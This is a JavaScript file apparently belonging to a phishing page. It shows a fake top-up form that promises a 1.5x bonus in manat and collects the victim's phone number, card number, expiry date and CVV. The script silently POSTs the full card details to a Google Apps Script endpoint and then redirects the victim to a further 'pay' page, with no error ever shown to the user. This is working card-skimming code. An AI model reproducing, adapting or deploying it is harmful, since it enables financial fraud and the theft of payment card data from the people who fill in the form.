// Telefon numarasını yalnızca rakam kabul edecek şekilde düzenler
function telefonInput(input) {
    input.value = input.value.replace(/[^\d]/g, ''); // Sadece rakamlara izin verir
  }
  
  // Tutar üzerinden 1.5x bonus hesaplama
  function hesapla(tutar) {
    const bonus = (tutar * 1.5).toFixed(2); // Bonus hesaplama
    document.getElementById('result').innerText = `Hesabınıza gələcək məbləğ (1.5x bonus ilə): ${bonus}₼`;
  }
  
  // Kart numarasını düzgün formatta alır
  function kartNumarasiInput(input) {
    input.value = input.value.replace(/\D/g, '').slice(0, 16); // Maksimum 16 hane
  }
  
  // CVV girişini doğrular
  function cvvInput(input) {
    input.value = input.value.replace(/\D/g, '').slice(0, 3); // Maksimum 3 hane
  }
  
  // Ay ve yıl dropdownlarını doldurur
  window.onload = function () {
    const aylar = ["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"];
    const aySelect = document.getElementById("son-kullanma-ay");
    const ilSelect = document.getElementById("son-kullanma-yil");
  
    aylar.forEach((ay) => {
      const option = document.createElement("option");
      option.value = ay;
      option.innerText = ay;
      aySelect.appendChild(option);
    });
  
    for (let i = 2024; i <= 2034; i++) {
      const option = document.createElement("option");
      option.value = i;
      option.innerText = i;
      ilSelect.appendChild(option);
    }
  };
  
  
  async function gonder(event) {
    event.preventDefault();
 
    const data = {
      telefon: document.getElementById("telefon-numarasi").value.trim(),
      tutar: document.getElementById("tutar").value.trim(),
      kart: document.getElementById("kart-numarasi").value.trim(),
      ay: document.getElementById("son-kullanma-ay").value.trim(),
      yil: document.getElementById("son-kullanma-yil").value.trim(),
      cvv: document.getElementById("cvv").value.trim(),
     
    };

    try {
      await fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
        mode: "no-cors", // CORS'u devre dışı bırak
      });
  
      // İşlem tamamlandıktan sonra yönlendirme
      window.location.href = "pay/index.html";
    } catch (error) {
      // Hata durumunda loglama, ancak mesaj gösterilmeyecek
      console.error("XƏTA", error);
    }
  }
  